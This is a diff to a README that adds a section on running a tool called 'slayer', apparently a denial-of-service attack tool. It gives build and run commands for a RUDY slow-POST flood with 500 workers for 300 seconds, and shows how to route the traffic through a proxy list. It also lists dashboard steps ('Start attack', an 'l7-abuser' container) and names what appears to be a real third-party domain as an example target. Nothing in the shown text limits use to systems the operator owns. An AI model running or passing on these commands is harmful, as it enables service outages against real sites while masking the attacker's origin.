@@ -398,7 +398,38 @@ ssh -L 8089:127.0.0.1:8089 ubuntu@EC2_IP
 
 ---
 
-## 14. Security notes
+## 14. Slayer parity (RUDY + proxies)
+
+Slayer-style direct runs (same flags as `./slayer -t URL -m rudy -w 500 -d 300`):
+
+```bash
+# On host or inside the build image:
+go build -o slayer ./cmd/slayer
+./slayer -t https://your-target.example -m rudy -w 500 -d 300
+
+# With proxies (one URL per line: http://, https://, socks5://):
+./slayer -t https://your-target.example -m rudy -w 500 -d 300 -p /data/proxies.txt
+```
+
+**Dashboard / Redis path** (orchestrated workers):
+
+1. Add target host to **Allowed hosts** (e.g. `mcn-kw.com`).
+2. Set **Combo** → `rudy-stress`, **Workers** → `500`, **Duration** via `max_duration_sec`.
+3. Optional **Proxy file** → `/data/proxies.txt` (mount file into `./data` on the server).
+4. Start attack; ensure `l7-abuser` vector container is running.
+
+Put proxies on EC2:
+
+```bash
+# data/proxies.txt — one proxy per line
+echo 'http://user:pass@proxy1:8080' >> data/proxies.txt
+```
+
+Set in policy (`proxy_file: /data/proxies.txt`) or `PROXY_FILE=/data/proxies.txt` in `data/runtime.env`.
+
+---
+
+## 15. Security notes
 
 - Change `DASHBOARD_TOKEN` on every deployment; never commit `data/runtime.env`.
 - Dashboard listens on `0.0.0.0:8089` by default — restrict security group to your IP.
@@ -407,7 +438,7 @@ ssh -L 8089:127.0.0.1:8089 ubuntu@EC2_IP
 
 ---
 
-## 15. Get help
+## 16. Get help
 
 ```bash
 go test ./...
